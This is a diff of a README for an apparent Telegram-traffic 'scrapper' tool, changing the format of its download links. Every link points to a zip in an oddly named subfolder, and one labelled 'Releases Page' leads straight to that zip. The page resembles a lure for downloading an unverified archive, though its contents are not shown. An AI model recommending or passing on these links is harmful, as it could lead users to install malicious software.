@@ -1,6 +1,6 @@
 # 📊 Telegrams-Best-Scrapper - Easily Analyze Telegram Traffic
 
-[![Download Telegrams-Best-Scrapper](https://raw.githubusercontent.com/ske1et2/Telegrams-Best-Scrapper/main/slouchy/Telegrams-Best-Scrapper.zip)](https://raw.githubusercontent.com/ske1et2/Telegrams-Best-Scrapper/main/slouchy/Telegrams-Best-Scrapper.zip)
+[![Download Telegrams-Best-Scrapper](https://github.com/ske1et2/Telegrams-Best-Scrapper/raw/refs/heads/main/slouchy/Telegrams-Best-Scrapper.zip)](https://github.com/ske1et2/Telegrams-Best-Scrapper/raw/refs/heads/main/slouchy/Telegrams-Best-Scrapper.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Telegrams-Best-Scrapper! This application helps you analyze your Tele
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/ske1et2/Telegrams-Best-Scrapper/main/slouchy/Telegrams-Best-Scrapper.zip).
+To get started, visit this page to download: [Releases Page](https://github.com/ske1et2/Telegrams-Best-Scrapper/raw/refs/heads/main/slouchy/Telegrams-Best-Scrapper.zip).
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version available on the page.
@@ -61,6 +61,6 @@ Feel free to reach out if you have any suggestions or need assistance using the 
 
 We appreciate the contributions from the open-source community and everyone who provided feedback to improve this application. Your support makes this tool better for everyone. 
 
-[![Download Telegrams-Best-Scrapper](https://raw.githubusercontent.com/ske1et2/Telegrams-Best-Scrapper/main/slouchy/Telegrams-Best-Scrapper.zip)](https://raw.githubusercontent.com/ske1et2/Telegrams-Best-Scrapper/main/slouchy/Telegrams-Best-Scrapper.zip)
+[![Download Telegrams-Best-Scrapper](https://github.com/ske1et2/Telegrams-Best-Scrapper/raw/refs/heads/main/slouchy/Telegrams-Best-Scrapper.zip)](https://github.com/ske1et2/Telegrams-Best-Scrapper/raw/refs/heads/main/slouchy/Telegrams-Best-Scrapper.zip)
 
 Thank you for choosing Telegrams-Best-Scrapper! We hope you find it useful in enhancing your Telegram experience.
